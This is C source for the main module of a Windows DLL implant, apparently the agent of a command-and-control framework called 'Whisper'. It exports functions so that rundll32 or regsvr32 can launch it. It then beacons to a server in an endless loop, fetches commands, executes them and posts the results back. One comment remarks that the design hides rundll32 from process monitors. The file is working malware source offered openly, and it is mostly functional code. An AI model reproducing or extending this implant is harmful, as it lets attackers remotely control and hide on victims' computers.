#include "comms_http.h"
#include "type_conversions.h"
#include "whisper_commands.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
// Function prototype
DWORD WINAPI BeaconLoop();
DWORD WINAPI execute_async(char * agent_id);

// Standard Exported Functions

//note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
//this also seems to hide rundll32 from showing up in processhacker. cewl

//other ideas: Queue APC call to start if doing shellcode

//COM
__declspec(dllexport) HRESULT DllRegisterServer() {
    MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
    return S_OK;
}
//COM
__declspec(dllexport) HRESULT DllUnregisterServer() {
    MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
    return S_OK;
}


 
// Other options
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
}
// Other options
__declspec(dllexport) void Start() {
    MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
}


// Global flag for thread control
//volatile BOOL keepRunning = TRUE;

// Entry point for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DEBUG_LOG("[DLL] Loaded into process\n");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_LOG("[DLL] Unloaded from process\n");
        //keepRunning = FALSE;
        break;
    }
    return TRUE;
}


// Main beacon loop (runs in a separate thread)
DWORD WINAPI BeaconLoop() 
{
    DEBUG_LOG("STARTING");

    char agent_id[37];
    generate_uuid4(agent_id);


    while (1) {

        // Create thread
        HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
        if (thread) {
            CloseHandle(thread); // Let the thread clean itself up
        } else {
            DEBUG_LOG("Failed to create thread.\n");

        }
        // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
        WhisperSleep(get_sleep_time());
    }
}

// Thread function for executing commands asynchronously
DWORD WINAPI execute_async(char * agent_id)
{

    //this fills in the command, arg and command_id
    InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
    //this populates the new structure with the agent_uuid
    InboundJsonData.agent_id = agent_id;

    if (!InboundJsonData.command) {
        DEBUG_LOG("Could not get command");
        return;
    }

    DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);

    //go ahead and setup our struct for outbound comms
    //using calloc for init on the values here
    OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
    if (!OutboundJsonData) {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
        return 1;
    }

    // Assign UUID
    OutboundJsonData->agent_id = strdup(agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
    OutboundJsonData->command_result_data = NULL;

    // Parse command and modify OutboundJsonData
    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData);

    DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
    DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
    DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");

    // Convert to JSON and send
    char* encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
    post_data(encoded_json_response, agent_id);

    // free allocated memory
    //need to double check this

    free(InboundJsonData.command);    // Allocated in decode_command_json
    free(InboundJsonData.command_id); // Allocated in decode_command_json
    free(InboundJsonData.args);       // Allocated in decode_command_json (if applicable)

    //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
    free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
    free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'


    return 0;
}

void generate_uuid4(char* uuid) {
    uint8_t bytes[16];

    // Seed the random number generator
    srand((unsigned int)time(NULL));

    // Generate 16 random bytes
    for (int i = 0; i < 16; i++) {
        bytes[i] = rand() % 256;
    }

    // Set the version to 4 --> 0100
    bytes[6] = (bytes[6] & 0x0F) | 0x40;

    // Set the variant to 10xxxxxx
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    // Format UUID as a string
    sprintf(uuid,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
    );
}
